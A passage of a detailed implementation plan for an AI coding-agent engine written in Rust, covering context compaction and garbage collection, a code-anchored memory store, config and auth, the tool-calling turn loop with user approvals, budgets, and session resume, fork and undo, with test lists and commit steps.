**Checkpoint 3 amendments (binding):** post-edit and diff baselines depend on older, removed outputs, so `forget_shown_at` alone is not enough: `apply_compaction` records `forgotten_paths` in the `CompactionRecord` (every path in `reads`/`writes` of the results with turn ≤ `last_removed_turn`, collected before they are dropped) and the engine calls `ReadTracker::forget_path` for each (Task 24). The summary request caps `max_output` at 4k tokens, and a summary whose estimate is not smaller than the removed turns is rejected (the turns are dropped without a summary, per Task 24). `compact.md` has the summarizer attribute requirements only to `[user]` turns and label anything taken from tool results.

**Files:**
- Create: `crates/tautly-context/src/compact.rs`
- Test: `crates/tautly-context/tests/compact.rs`

**Interfaces:**
- Produces: `fn Context::needs_compaction(&self, status: &ContextStatus, threshold: Option<f32> /* 0.8 */, now: Instant, ttl: Option<Duration>, price: Option<&Price>) -> bool` and `fn Context::compaction_decision(…same arguments…) -> Option<MutationReason>`; `fn Context::compaction_request(&self, model: &ModelId, caps: &Capabilities, keep_recent: usize) -> (CanonicalRequest, usize /* turns to remove */)`; `fn Context::apply_compaction(&mut self, removed: usize, summary: String) -> Result<CompactionRecord, CompactError>` with `enum CompactError { Nothing, SummaryTooLong { summary: u32, removed: u32 } }` (an empty summary is accepted: the drop-without-summary fallback); `fn Context::uncompact(&mut self, rec: &CompactionRecord, budget: u32) -> Result<(), UncompactError>`; `struct CompactionRecord { removed_turns: Vec<Turn>, summary: String, first_removed_turn: u32, last_removed_turn: u32, forgotten_paths: Vec<PathBuf> }`.

- [ ] **Step 1: Write the failing tests:** `triggers_at_80_percent_not_below`; `disabled_threshold_never_triggers` (threshold `None`); `pinned_and_state_survive_verbatim` (assert identical before/after); `keeps_recent_turns_verbatim` (default `keep_recent = 4`); `summary_replaces_removed_turns_as_single_block`; `uncompact_restores_when_fits`; `uncompact_refuses_when_too_large`; `compaction_request_instructs_to_preserve_open_questions_and_decisions` (prompt text contains those words).
- [ ] **Step 2: Run** `cargo test -p tautly-context --test compact` — Expected: FAIL.
- [ ] **Step 3: Implement.** Never split a tool-use/tool-result pair across the cut.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(context): state-preserving reversible compaction"`

### Task 21: Context garbage collection

**Checkpoint 2 amendments (binding):** Supersede detection uses effects, not args (one batched read covers up to 10 paths). A read whose `shown` is `Unchanged`/`Diff` never supersedes its base. Whenever any read result of path P is elided, call `ReadTracker::forget_path(P)`.

**Files:**
- Create: `crates/tautly-context/src/gc.rs`; modify `lib.rs`, `assemble.rs`
- Test: `crates/tautly-context/tests/gc.rs`

**Interfaces:**
- Consumes: `Context`, `Turn` (Task 19); `CompactionRecord`, `uncompact` (Task 20).
- Also (spec 7.7): add `cache_ttl_s: Option<u32>` to the catalog `ModelInfo`/TOML (default 300 for explicit/automatic cache styles, None otherwise) and `crates/tautly-context/src/schedule.rs` with `struct CacheClock { last_request: Option<Instant>, cached_prefix_tokens: u32 }`, `fn Context::note_request(&mut self, at: Instant, cached_prefix_tokens: u32)`, `enum MutationReason { ColdCache, CostBenefit, Forced, Manual }`, `fn schedule::decide(clock: &CacheClock, now: Instant, ttl: Option<Duration>, tokens_freed: u32, price: Option<&Price>, used: u32, window: u32) -> Option<MutationReason>` (cold → ColdCache; used ≥ 90% → Forced; warm with price: `tokens_freed × input × 5 > invalidated_prefix × (cache_write − cache_read)` → CostBenefit; no price → threshold max(2000, 5%) → CostBenefit; else None). `Context::collect` takes the decision as input and `GcRecord` carries `reason`. `Context::needs_compaction` returns true at ≥ 80% only when `decide` would mutate, and always at ≥ 90%. Tests: `cold_cache_applies_any_pending`, `warm_cache_defers_when_not_worth_it`, `warm_cache_applies_when_savings_exceed_cache_write_cost`, `forced_at_90_percent`, `no_price_falls_back_to_threshold`, `compaction_deferred_between_80_and_90_while_warm`.
- Produces: `fn Context::push_tool_result(&mut self, call_id: &str, tool: &str, args: &Value, effects: &[AppliedEffect], is_error: bool, turn: u32)` (records `ResultMeta { call_id, tool, turn, elided, reads: Vec<ReadTarget>, writes: Vec<PathBuf>, failed_edit: Vec<PathBuf>, command: Option<String> }`, keyed by the effects' paths, never by `args`); `fn Context::gc_decision(&self, now, ttl, price, used, window) -> Option<MutationReason>`; `fn Context::collect(&mut self, reason: Option<MutationReason>) -> Option<GcRecord>`; `struct GcRecord { elided: Vec<(String /* call_id */, String /* original output */)>, tokens_freed: u32, reason: MutationReason, forgotten_paths: Vec<PathBuf> }`; `fn Context::restore_gc(&mut self, rec: &GcRecord)`.

- [ ] **Step 1: Write the failing tests:** `read_superseded_by_later_edit_of_same_path`; `read_superseded_by_later_reread`; `bash_superseded_by_same_command_string`; `failed_edit_superseded_by_later_successful_edit`; `latest_result_never_elided`; `stub_text_and_call_id_preserved` (output == `[elided: superseded at turn N]`, call id unchanged, tool_use/tool_result pairing intact); `below_threshold_returns_none` (threshold = max(2000, 5% of window)); `above_threshold_elides_all_superseded`; `restore_gc_restores_original_outputs`.
- [ ] **Step 2: Run** `cargo test -p tautly-context --test gc` — Expected: FAIL.
- [ ] **Step 3: Implement.** `collect` is a pure function of context state; the engine decides when to call it (step start only, before each provider request — Task 24).
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(context): cache-aware context garbage collection"`

### Task 22: Memory store and `recall` / `remember` tools

**Checkpoint 2 amendments (binding):** `symbol_hash` lookups must pass parent/kind when known (use the checkpoint-2 `symbol_hash_in(rel, name, parent, kind)`); reject or flag anchors whose `file_hash` is None (unindexed) or empty (oversize).

**Files:**
- Create: `crates/tautly-memory/src/{lib.rs,entry.rs,store.rs,stale.rs,search.rs,episodes.rs,consolidate.rs}`, `crates/tautly-tools/src/memory_tools.rs`; modify `crates/tautly-tools/src/{lib.rs,pin_state.rs}` (`ToolCx` gains `memory: Option<Arc<RwLock<MemoryStore>>>`; `ContextOp` gains `Remember(MemoryDraft)`)
- Test: `crates/tautly-memory/tests/memory.rs`, `crates/tautly-tools/tests/memory_tools.rs`

**Interfaces:**
- Consumes: `Index::{file_hash, symbol_hash}` (Task 14); `paths::{data_home, project_hash}` (Task 18).
- Produces:
  - `enum MemoryKind { Convention, Fact, Gotcha, Command }`; `struct MemAnchor { path: PathBuf, symbol: Option<String>, hash: String }`
  - `struct MemoryEntry { id: String, title: String, kind: MemoryKind, anchors: Vec<MemAnchor>, created: SystemTime, verified: Option<SystemTime>, body: String, stale: bool /* not serialized */ }` — file format: YAML frontmatter + markdown body
  - `struct MemoryDraft { id: Option<String>, title: String, kind: MemoryKind, anchors: Vec<(PathBuf, Option<String>)>, body: String }`
  - `struct MemoryChange { upsert: Option<MemoryEntry>, delete: Vec<String> }`
  - `struct MemoryStore` with `fn open(project_root: &Path, index: Arc<Index>) -> Result<Self, MemoryError>`, `fn entries(&self) -> &[MemoryEntry]`, `fn refresh_staleness(&mut self) -> usize`, `fn index_block(&self, budget_tokens: u32, est: &dyn Fn(&str) -> u32) -> (String, bool /* over budget */)`, `fn draft_to_change(&self, d: MemoryDraft, est: &dyn Fn(&str) -> u32) -> Result<MemoryChange, MemoryError>` (fills anchor hashes; body > 300 tokens → `MemoryError::TooLong`), `fn apply(&mut self, c: &MemoryChange) -> Result<(), MemoryError>`, `fn search(&self, query: &str, k: usize, cap_tokens: u32, est: &dyn Fn(&str) -> u32) -> Vec<Hit>`, `fn write_episode(&self, session_id: &str, markdown: &str) -> Result<PathBuf, MemoryError>`, `fn consolidation_request(&self) -> String` (prompt listing all entries for the side model), `fn parse_consolidation(&self, reply: &str) -> Result<Vec<MemoryChange>, MemoryError>` (expects a JSON array of `{merge: [ids], into: {title, kind, body}}` / `{delete: id}`)
  - `struct Hit { source: HitSource /* Project(id) | Episode(session_id) */, title: String, text: String, stale: bool, score: f32 }`
  - `RecallTool` (`ReadOnly`), `RememberTool` (`ReadOnly`; returns `proposed; awaiting user approval` and writes nothing). Final registry order: `read, edit, write, bash, grep, glob, outline, symbol, refs, web_fetch, recall, remember, pin, state` (`assemble` sorts tools by name before they reach a provider, so registry order has no effect on the wire or on caching).

- [ ] **Step 1: Write the failing tests**

```rust
#[test] fn entry_roundtrips_through_frontmatter_file() {}
#[tokio::test] async fn anchored_symbol_change_marks_stale() {
    let (t, idx, mut m) = setup(&[("lib.rs","fn a(){1}\nfn b(){2}")]);
    m.apply(&m.draft_to_change(draft_anchored("lib.rs", Some("a")), &est).unwrap()).unwrap();
    write(t.path().join("lib.rs"), "fn a(){9}\nfn b(){2}"); idx.reindex_file(Path::new("lib.rs")).await.unwrap();
    assert_eq!(m.refresh_staleness(), 1); assert!(m.entries()[0].stale);
}
#[tokio::test] async fn change_to_other_symbol_does_not_mark_stale() {}
#[test] fn index_block_marks_stale_and_respects_500_token_budget_dropping_oldest_unverified_first() {}
#[test] fn search_ranks_relevant_entry_first() { /* "pnpm" query → convention "use pnpm not npm" ranked 1 */ }
#[test] fn search_includes_episodes_and_caps_at_2000_tokens() {}
#[test] fn draft_body_over_300_tokens_rejected() {}
#[test] fn parse_consolidation_produces_merge_and_delete_changes() {}
#[tokio::test] async fn remember_tool_emits_context_op_and_writes_nothing() {}
#[tokio::test] async fn recall_tool_flags_stale_hits() {}
#[test] fn registry_order_is_stable() { /* final order above */ }
```

- [ ] **Step 2: Run** `cargo test -p tautly-memory && cargo test -p tautly-tools --test memory_tools` — Expected: FAIL.
- [ ] **Step 3: Implement.** Entry id = slug of title + 4 hex chars. BM25 (k1 = 1.2, b = 0.75) over lowercase alphanumeric tokens of title + body, built in memory at open (corpus is small); episodes loaded lazily on first search. Anchors without a `symbol` use `file_hash`.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(memory): code-anchored memory store, recall and remember tools"`

### Task 23: Config, auth, protocol types

**Files:**
- Create: `crates/tautly-core/src/{lib.rs,protocol.rs,config.rs,auth.rs}`
- Test: `crates/tautly-core/tests/{config.rs,protocol.rs}`
- No edits outside `tautly-core`: the serde derives `Event` needs on other crates' types were done in fix wave B (see Consumes).

**Interfaces:**
- Consumes: serde derives from fix wave B on tautly-tools `AppliedEffect`/`Shown`/`LineRange`/`ToolMeta` (and `PersistedEffect`, `pre_image` bytes as blob references), tautly-memory `MemoryChange`/`MemoryEntry`/`MemAnchor`, and tautly-context `Breakdown`/`ContextStatus`/`MutationReason`/`GcRecord`/`CompactionRecord` (tautly-context now depends on `serde`). `PathBuf` serde fails on non-UTF-8 paths (Linux): events show such a path lossily (`to_string_lossy`); persisted records skip it with a warning (Task 24 note)
- Produces:
  - `struct Config { model: ModelId, providers: ProvidersConfig, permissions: PolicyConfig, compaction_threshold: Option<f32> /* 0.8 */, max_turns: u32 /* 100 */, turn_timeout_s: Option<u64>, budget: BudgetConfig, telemetry: TelemetryConfig /* enabled=false */, pins: Vec<String>, catalog_overrides: Option<Catalog>, routing: RoutingConfig { side_model: Option<ModelId> }, approve_memory: bool /* false */ }`
  - `fn Config::load(root: &Path, cli: CliOverrides) -> Result<Config, ConfigError>` — user then project then CLI; tables merge deeply, arrays replace
  - `struct ProvidersConfig { anthropic: Option<ProviderEntry>, openai: Option<ProviderEntry>, google: Option<ProviderEntry>, compat: Vec<CompatEntry> }`; `struct ProviderEntry { base_url: Option<Url>, api_key_env: Option<String> }`; `struct CompatEntry { name: String, base_url: Url, api_key_env: Option<String> }`
  - `fn auth::api_key(provider: &str, entry: &ProviderEntry) -> Result<Option<String>, AuthError>` — env var (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GEMINI_API_KEY`, or configured name) then keychain service `tautly`, account = provider
  - `enum Event` and `enum Command` exactly as spec §3.2/§3.3 (including `Usage.role: UsageRole { Main, Side }`, `ContextCollected`, `MemoryProposed{proposal_id, change: MemoryChange}`, `SessionChanged`, `ApproveMemory`, `RejectMemory`, `ConsolidateMemory`; `ToolFinished.blocked: bool`; `Compacted.reason` / `ContextCollected.reason` as `MutationReason`; `MemoryChange { upsert: Option<MemoryEntry>, delete: Vec<String> }` re-exported from `tautly-memory`), `#[serde(tag = "type", rename_all = "snake_case")]`; `enum FinishReason { Completed, Cancelled, Budget, MaxTurns, Timeout, Error }`; `enum ErrorKind { ProviderTransient, ProviderFatal, ContextOverflow, Tool, Policy, Internal }`
  - `const PROTOCOL_VERSION: (u32, u32) = (1, 0)`

- [ ] **Step 1: Write the failing tests:** `project_overrides_user_and_cli_overrides_project`; `arrays_replace_not_concat`; `defaults_match_spec` (threshold 0.8, telemetry disabled, mode Ask); `env_key_wins_over_keychain` (keychain mocked via trait); `event_json_shape_is_stable` (insta snapshot of one of each `Event` variant); `command_roundtrip`.
- [ ] **Step 2: Run** `cargo test -p tautly-core --test config --test protocol` — Expected: FAIL.
- [ ] **Step 3: Implement.** Wrap keychain behind `trait SecretStore` so tests inject a fake.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core): config layering, auth, protocol types"`

### Task 24: Engine turn loop and approvals

**CP3 round-2 note (binding):** apply a tool call's `ContextOp` before its result is sent to the model; if `Context::pin`/`apply_op` returns an error (e.g. `PinError::TooMany`, over-size), replace that call's result with the error text so the model never believes a refused pin was kept.

**Client-protocol amendment (binding, user-approved 2026-11-03; spec 3.4):** `EngineBuilder` takes an optional shared `Arc<Workspace>` (index, watcher, memory store for one root) so several engines in one process share them; without it the builder opens its own. Approval requests carry a `request_id`, and `Command::Approve`/`Deny` name it.

**Task 38 review note (binding):** build the repo map off the startup path (spawn_blocking) once per session; on a first-ever session with no ready index the map is empty for that session — acceptable in v1, but log it. Call `init_repo_map` exactly once at session start, ignore a `false` return, never retry per turn (a later success would change the stable prefix mid-session). Before the first `assemble`, await both the repo map and the first memory index for a bounded ~300 ms (otherwise request 2's stable prefix differs and the cache is lost); on timeout the slot stays empty for the session. Read-tracker turn numbers and `Context` turn numbers are the same absolute step counter (Task 20's `CompactionRecord` reports the last removed absolute turn; pass it to `ReadTracker::forget_shown_at` and call `ReadTracker::forget_path` for every `CompactionRecord.forgotten_paths` entry).

**Task 21 review note (binding):** at every step start (before each provider request) compute `gc_decision` and `compaction_decision` together; if either fires, apply both in the same cache epoch (`collect(gc.or(compaction))`, then compaction if pending, then the pending memory index per Task 28) so the prefix breaks once. Call `Context::fold_session_pins()` on any applied epoch, including `ColdCache` (also when nothing is collected), so session pins do not pile up in the uncached tail. On resume, rebuild `Context.results` by replaying `push_tool_result(call_id, tool, args, effects, is_error, turn)` from the logged `ToolResult` records (effects included), re-apply the logged `GcApplied` records with `Context::reapply_gc` (Task 26) and the `MemoryIndexApplied` records, and set `Context.root` to the canonical root.

**Task 20 review note (binding):** turn numbers are 1-based everywhere (`Context::next_turn()` is the number passed to `ToolCx::with_turn`, read before the step's `Turn` is pushed); if the summarizer request still fails (provider overflow or error), fall back to dropping the oldest removable turns without a summary (`apply_compaction(removed, String::new())`, announced via `Compacted{reason}`), never loop retrying the same request; the same fallback applies when `apply_compaction` returns `CompactError::SummaryTooLong`. A resumed session sets `Context.first_turn` from the session log. On cancel or crash recovery, every `tool_use` without a result gets a synthetic error result (`cancelled`) so no unanswered call pins the compaction cut.

**Task 19 re-review note (binding):** after each provider response call `Context::calibrate(&status, &usage)` with the `ContextStatus` of the request just sent (it sums `input + cache_read + cache_write` and uses the flat tokens recorded in `status`; never `usage.input` alone, never `TokenEstimator::calibrate`), and `Context::note_request(at, status.cached_prefix)` (`ContextStatus.cached_prefix` is the token length up to the last breakpoint, so the engine never re-sums block estimates); when a response is cut off right after a reasoning item, drop that trailing reasoning item from history; on a mid-session model switch to another provider, strip `Reasoning`/`RedactedReasoning` content produced by a different provider before the next request (redacted payloads are provider-specific).

**Task 19 review note (binding):** every step ends in the plain-text state tail, which a provider may treat as a new user turn and so drop earlier reasoning; a mock cannot observe that. Task 35's live smoke suite runs, per provider, a three-step tool loop with reasoning on and compares reasoning/cache tokens with and without the state tail; if continuity is lost, switch that adapter to place the state inside the last tool result's content (Anthropic `tool_result` content blocks, OpenAI `function_call_output.output`, Gemini `functionResponse.response`) using the `CanonicalRequest.volatile_tail` marker (fix wave B), with the last breakpoint on the block before it. The engine passes a canonicalized root (same canonicalization as the sandbox) into `Context.root` and calls `agents_md::load(&sandbox)` + `Context::set_agents_md` exactly once; a user `/pin` (`Command::Pin`) calls `Context::pin(text, PinSource::User)` and reports a `PinError` to the user. The sandbox root is the git top level when the start directory is inside a git work tree (else the start directory); an ancestor `AGENTS.md` above that root follows the confinement rule of spec 6.1 (its link target must stay inside the directory holding it).

**Checkpoint 2 amendments (binding):** Ordering: partition calls into maximal runs; consecutive ReadOnly calls run concurrently; every Write/Exec/Network call is a barrier executed alone in model order; ContextOps (pin/state/remember) apply in model order after each run. Index: open it on a blocking task AFTER the first event (ToolCx gets `index: None` until ready), start the watcher (`Index::start_watcher`) and keep the `WatchHandle` in the actor; if the watcher fails or stops (`watching()` false) tools treat the index as stale. Emit `last_error()` once as a status warning. On Cancel, forget every read baseline committed by results that are not appended (use effects' `shown`). Write-generation bumps on `Edited | Deleted | Exec`. Resume replays ToolCall records through `parse_context_op` (ContextOp has no serde). Run spill cleanup at engine start.

**Checkpoint 3 amendments (binding):** (1) A context `Turn` is one provider step (assistant message plus its tool results; the user's prompt is its own turn). GC and compaction decisions run at every step start, `max_turns` counts steps, `TurnStarted`/`TurnFinished` stay per user message, and `next_turn()` is read before the step's `Turn` is pushed. (2) After a concurrent run, push tool results to `Context` (`push_tool_result` and history) in model order, not finish order. (3) Persist the contents of GC and compaction records as session blobs (the originals of GC-elided results are already each `ToolResult`'s result blob, so `GcApplied` stores ids only; `CompactionRecord.removed_turns` are blobs) and keep only references plus the latest compaction record in memory. (4) Tool order on the wire is `assemble`'s name sort; `registry()` order does not matter for caching. (5) Apply the pending memory index text only as Task 28 describes. (6) A persisted record whose path is not valid UTF-8 (Linux) must not abort the session log: the engine skips that path's entry in the persisted `effects`/`Edit` records and emits a warning status event (`non-UTF-8 path not tracked`); in memory the effect applies normally, so only resume and undo lose it.

**Files:**
- Create: `crates/tautly-core/src/{engine.rs,turn.rs,approvals.rs}`
- Test: `crates/tautly-core/tests/engine_loop.rs`

**Interfaces:**
- Consumes: everything above.
- Produces:
  - `struct EngineBuilder { config: Config, root: PathBuf, provider: Option<Arc<dyn Provider>>, sandbox: Option<Arc<dyn Sandbox>>, resume: Option<String> }` with `fn build(self) -> Result<(Engine, mpsc::Receiver<Event>), EngineError>` (event channel capacity 256)
  - `struct Engine` with `async fn send(&self, cmd: Command) -> Result<(), EngineError>` and `fn session_id(&self) -> &str`
  - Session record type `enum SessionRecord { Command(Command), Request { hash: BlobRef }, Provider(ProviderEvent), ToolCall { id: String, name: String, args: Value }, ToolResult { id: String, result_blob: BlobRef, is_error: bool, effects: Vec<PersistedEffect>, meta: ToolMeta }, Edit { path: PathBuf, pre_image: Option<BlobRef>, turn: u32 }, Compaction { removed: Vec<BlobRef>, summary: String }, GcApplied { elided: Vec<(String /* call_id */, u32 /* stub turn */)>, reason: MutationReason, tokens_freed: u32, forgotten_paths: Vec<PathBuf> }, MemoryIndexApplied { text: String }, PinsFolded, TurnEnd { reason: FinishReason } }` (`PersistedEffect` mirrors `AppliedEffect` with `pre_image` bytes stored as blob references; `GcApplied` holds no text, the originals are already in each `ToolResult`'s blob; with `GcApplied` and `MemoryIndexApplied`, resume reproduces the exact prefix, re-applying `GcApplied` via `Context::reapply_gc(&GcApplied)`, added in Task 26)

- [ ] **Step 1: Write the failing tests** (all use `MockProvider` + `LocalSandbox` on a tempdir)

```rust
#[tokio::test] async fn text_only_turn_completes() { /* events: TurnStarted, TextDelta*, Usage, ContextStatus, TurnFinished{Completed} */ }
#[tokio::test] async fn tool_loop_runs_until_no_tool_calls() { /* mock: [ToolCall read] then [text] → two provider requests; second contains ToolResult */ }
#[tokio::test] async fn ask_emits_approval_and_waits() { /* write tool in Ask mode → ToolApprovalRequested; nothing written until Approve; Deny → ToolResult is_error "denied by user" */ }
#[tokio::test] async fn read_only_calls_run_concurrently_writes_sequentially() { /* two grep calls overlap (timestamps); two writes don't */ }
#[tokio::test] async fn malformed_tool_args_return_error_result_and_continue() { /* input_json "{not json" → ToolResult is_error, next request sent, turn completes */ }
#[tokio::test] async fn unknown_tool_name_returns_error_result() {}
#[tokio::test] async fn policy_deny_reports_rule() { /* deny rule → Error{kind: Policy} not emitted; ToolResult contains rule text */ }
#[tokio::test] async fn mid_stream_drop_reissues_from_last_complete_message() { /* DropAfter([ToolCall partial]) then full → tool executed exactly once */ }
#[tokio::test] async fn records_appended_before_events_visible() { /* on receipt of ToolFinished, session file already contains ToolResult */ }
#[tokio::test] async fn pin_and_state_tools_update_context() {}
#[tokio::test] async fn context_gc_runs_only_at_step_start_and_emits_context_collected() { /* script re-reads a large file 6× in one prompt; ContextCollected emitted between provider requests (before a step's request), never while a step's tools run */ }
#[tokio::test] async fn identical_failed_call_with_no_writes_since_is_blocked() { /* bash `cargo test` fails twice in script → second not executed, ToolFinished.blocked == true, result mentions "already tried at turn" */ }
#[tokio::test] async fn blocked_call_repeated_immediately_runs() {}
#[tokio::test] async fn write_since_failure_unblocks_retry() {}
#[tokio::test] async fn failed_attempts_appear_in_working_state_capped_at_10() {}
#[tokio::test] async fn edits_reindex_before_result_returned() { /* edit then symbol in same turn sees new body */ }
#[tokio::test] async fn max_turns_stops() { /* max_turns=2 counts steps; mock always calls a tool → TurnFinished{MaxTurns} */ }
```

- [ ] **Step 2: Run** `cargo test -p tautly-core --test engine_loop` — Expected: FAIL.
- [ ] **Step 3: Implement.** Engine runs one actor task owning `Context`, `SessionWriter`, `Policy`, `ReadTracker`; commands arrive on an mpsc; each turn is a child task with a child `CancellationToken`. Loop breaker (spec 7.8) lives in `crates/tautly-core/src/attempts.rs`: `struct AttemptLedger` with `fn check(&mut self, tool: &str, args: &Value) -> Option<BlockedBy>` and `fn record(&mut self, tool, args, turn, ok: bool, signature: &str)`, plus a write-generation counter bumped on `Edited | Deleted | Exec`. Engine owns `Arc<Index>` (opened on a blocking task after the first event is emitted, `ToolCx` gets `index: None` until ready; `spawn_background_refresh` started once open, so start-up is not delayed) and passes it, the step's turn number and the spill dir in `ToolCx`; record every tool result with `Context::push_tool_result(call_id, tool, args, effects, is_error, turn)`; at every step start (and only then) compute `gc_decision`/`compaction_decision`, apply them as one epoch via `Context::collect(reason)` and compaction, and persist the result (`GcApplied`). Tool calls resolve through `registry()`; `Approve`/`Deny` resolve pending approvals by `request_id` via a `HashMap<String, oneshot::Sender<bool>>`. Provider is wrapped in `Retrying`. Checkpoint the session at every tool boundary and turn end.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core): engine turn loop, approvals, tool dispatch"`

### Task 25: Cancellation, budgets, ledger, signals

**Task 24 review note (binding):** count the usage of a discarded (re-sent) provider attempt in the ledger and budgets, so cost is never under-reported. If Task 25 drops tool futures on a hard deadline, also drop the read baselines recorded at that step (add a per-turn forget to `ReadTracker`).

**Task 23 review note (binding):** if the active model has no catalog price (`cost_usd = null`) while a `max_usd` budget is set, emit a `Warning` once and enforce only the token budgets for that model; never treat an unknown price as zero cost silently.

**Checkpoint 2 amendments (binding):** The process-group registry also reaps per-call bash reader tasks/fds on return; spill cleanup (age/size cap) runs at engine start if Task 24 didn't add it.

**Files:**
- Create: `crates/tautly-core/src/{budget.rs,ledger.rs}`; modify `engine.rs`, `turn.rs`
- Test: `crates/tautly-core/tests/{cancel_budget.rs,ledger.rs}`

**Interfaces:**
- Produces: `struct Budget { max_usd: Option<f64>, max_tokens: Option<u64> }`; `fn Budget::check(&self, spent_usd: f64, spent_tokens: u64) -> BudgetState`; `enum BudgetState { Ok, Warn, Exceeded }` (Warn at ≥ 80%); `struct Ledger::open(path: &Path) -> Result<Ledger>` (WAL, `busy_timeout` 5 s); `fn Ledger::record(&self, session: &str, model: &ModelId, usage: &RawUsage, cost: Option<f64>) -> Result<()>`; `fn Ledger::totals(&self, since: SystemTime) -> Result<Totals>`; `fn install_signal_handlers(engine: Engine)` (SIGINT handled by clients; SIGTERM/SIGHUP → `Command::Shutdown`).

- [ ] **Step 1: Write the failing tests:** `cancel_ends_turn_with_cancelled_and_kills_children_within_200ms` (bash `sleep 300` running; send `Cancel`; `TurnFinished{Cancelled}` within 250 ms; no `sleep` processes); `budget_warns_at_80_percent`; `budget_exceeded_finishes_inflight_tool_then_stops` (`TurnFinished{Budget}`; the in-flight tool's result is recorded); `turn_timeout_finishes_with_timeout`; `usage_event_includes_cost_and_quota`; `ledger_two_processes_concurrent_writes` (two `Ledger` handles on same file from two threads, 500 inserts each, totals == 1000); `shutdown_kills_all_process_groups_and_session_is_resumable` (send `Shutdown` mid-bash; reopen reader; `truncated_tail` false, last record is `TurnEnd{Cancelled}` or turn detectably incomplete).
- [ ] **Step 2: Run** `cargo test -p tautly-core --test cancel_budget --test ledger` — Expected: FAIL.
- [ ] **Step 3: Implement.** Budget is checked after each `Usage`; on `Exceeded` set a flag that stops the loop at the next tool boundary.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core): cancellation, budgets, cost ledger, signal handling"`

### Task 26: Resume, fork, undo, compaction wiring

**Lane-merge notes (binding):** every started user turn ends with a `TurnEnd` record; on resume after a crash, write the missing `TurnEnd` before anything else (Task 42's session diff attributes edits by `TurnEnd` count). Fork copies records with `SessionWriter::copy_from` (keeps each record's original `t`); it skips unknown envelope types, so record offsets in a child can differ from the parent's — map `Fork{at}` by step numbers, not raw offsets. Step numbers are the single context turn counter (user messages count too, so they have gaps); `/tree`, replay, compare and `--at N` all use these numbers. "Continue here" lists sessions with `list_here_in(<git top-level root>)`.

**Time-travel note (binding, user-approved 2026-11-03; spec 6.5 H5/H7/H9, 7.12):** Task 48 runs first.
- **Point-in-time rebuild:**
  - `rebuild` takes `until: Option<u32>` (step), `fn resume::rebuild(reader: &SessionReader<SessionRecord>, until: Option<u32>) -> Result<Rebuilt, ResumeError>`. It cuts only at step boundaries and gives open calls synthetic `cancelled` results.
  - `Command::Fork { at: Option<u32>, label: Option<String> }` creates a conversation-only branch at any step: records up to step `at` copied verbatim, header `origin: fork`, `parent: (id, offset of step at's end)`, `label`. Files are not touched.
- **Logged prefix inputs:** resume uses the last `PrefixApplied` `agents_md`/`repo_map` blobs, never fresh disk content. A differing `system_prompt_hash`/`tools_hash` emits a `Warning` (the cache will be cold).
  - `resume_rebuilds_context_identically` must also pass after `AGENTS.md` and the repo map changed on disk.
  - Add `rebuild_until_step_matches_live_prefix_at_that_step` and `fork_at_step_copies_records_and_sets_parent_label_origin`.
- **Undo is logged (H7):** undo blobs each file's current content first and appends `SessionRecord::Undone { turn, files: Vec<UndoneFile>, backup_ref: None }`. `rebuild` replays it. Add `undo_appends_undone_record_with_from_and_to_blobs`.

**Task 25 review note (binding):**
- **Budget spend on rebuild:** session spend comes from the ledger's session column, `Ledger::session_totals(session_id) -> Result<Totals>` (add it), which includes discarded attempts. Without the ledger, it falls back to summing logged `Provider(Usage)` records, with a `Warning`.
- **Budgets:** logged `SetBudget` commands are replayed in order. Forks and rewinds start a new session id with zero spend.
- **Tests:** `resume_restores_budget_spend_and_set_budget`.

**Checkpoint 2 amendments (binding):** Fork gives the child a fresh ReadTracker; undo uses `Edited.pre_image/pre_mode` and `Deleted` (restore file + mode).

**Checkpoint 3 amendments (binding):** `rebuild` replays the `ToolResult` records' `effects`/`meta` through `push_tool_result` and `apply_effects`, and the `GcApplied`/`MemoryIndexApplied` records (Task 24), so the files list, `Context.results`, GC elisions and the memory index text are exactly as before. GC originals and `CompactionRecord` contents are read back from session blobs (each `ToolResult`'s result blob by call id for `restore_gc`; only references and the latest compaction record stay in memory), which `Uncompact` and `restore_gc` use. Use `Context::reapply_gc(&[(call_id, by_turn)])` (added at checkpoint 3 in tautly-context; `GcRecord.elided` entries carry `by_turn`, so Task 24 builds `GcApplied.elided` straight from the record) and pass `forgotten_paths` to the rebuilt ReadTracker, used by `rebuild`. A `PinsFolded` record (written by Task 24 whenever `fold_session_pins()` returns true) makes `rebuild` fold at that position, so the prefix after resume is identical. Fork copies the parent's records verbatim (no re-serialization, so fields a newer version added survive).

**Files:**
- Create: `crates/tautly-core/src/resume.rs`; modify `engine.rs`
- Test: `crates/tautly-core/tests/resume.rs`

**Interfaces:**
- Produces: `fn resume::rebuild(reader: &SessionReader<SessionRecord>) -> Result<Rebuilt, ResumeError>`; `struct Rebuilt { context: Context, incomplete_turn: bool, turn_count: u32 }`; engine handles `Command::Fork` (opens a new writer with `parent=(id, offset)` and emits `Event::SessionChanged{session_id}`), `Command::Compact`, `Command::Uncompact`; `fn undo(reader, sandbox, turn: Option<u32>) -> Result<Vec<PathBuf>, UndoError>` restoring pre-images of the given (default last) turn in reverse order, deleting files whose pre-image is `None`.

- [ ] **Step 1: Write the failing tests:** `resume_rebuilds_context_identically` (assembled request after resume == before, including the files list, GC elisions and memory index text); `resume_after_crash_mid_turn_marks_incomplete_and_continues_on_next_message`; `fork_creates_child_with_parent_offset`; `auto_compaction_announced_before_running` (`Compacted` preceded by `ContextStatus` with warning "compacting"); `context_overflow_compacts_and_retries_once`; `uncompact_command_restores` (also restores GC elisions via `restore_gc`); `undo_last_turn_restores_files`; `undo_deletes_files_created_in_turn`.
- [ ] **Step 2: Run** `cargo test -p tautly-core --test resume` — Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core): resume, fork, undo, compaction wiring"`

### Task 27: Side-model routing

